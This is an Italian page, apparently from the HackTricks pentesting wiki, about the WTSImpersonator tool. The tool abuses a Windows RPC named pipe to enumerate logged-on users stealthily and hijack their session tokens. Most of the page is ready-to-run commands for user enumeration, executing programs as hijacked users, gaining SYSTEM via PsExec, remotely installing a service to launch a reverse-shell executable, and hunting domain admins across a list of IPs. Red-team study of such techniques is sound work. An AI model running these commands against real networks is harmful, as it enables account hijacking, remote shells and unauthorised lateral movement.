<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Lo strumento **WTS Impersonator** sfrutta la Named pipe RPC **"\\pipe\LSM_API_service"** per enumerare in modo furtivo gli utenti connessi e dirottare i loro token, eludendo le tecniche tradizionali di impersonificazione dei token. Questo approccio facilita gli spostamenti laterali all'interno delle reti. L'innovazione dietro questa tecnica è attribuita a **Omri Baso, il cui lavoro è accessibile su [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Funzionalità principali
Lo strumento opera attraverso una sequenza di chiamate API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Moduli chiave e utilizzo
- **Enumerazione degli utenti**: È possibile enumerare gli utenti locali e remoti con lo strumento, utilizzando comandi per entrambi gli scenari:
- Localmente:
```powershell
.\WTSImpersonator.exe -m enum
```
- In remoto, specificando un indirizzo IP o un nome host:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Esecuzione di comandi**: I moduli `exec` e `exec-remote` richiedono un contesto di **Servizio** per funzionare. L'esecuzione locale richiede semplicemente l'eseguibile WTSImpersonator e un comando:
- Esempio di esecuzione di un comando locale:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- È possibile utilizzare PsExec64.exe per ottenere un contesto di servizio:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Esecuzione di comandi remoti**: Coinvolge la creazione e l'installazione di un servizio in remoto simile a PsExec.exe, consentendo l'esecuzione con le autorizzazioni appropriate.
- Esempio di esecuzione remota:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modulo di ricerca utente**: Permette di individuare utenti specifici su più macchine, eseguendo codice con le loro credenziali. Questo è particolarmente utile per prendere di mira gli amministratori di dominio con diritti di amministratore locale su diversi sistemi.
- Esempio di utilizzo:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
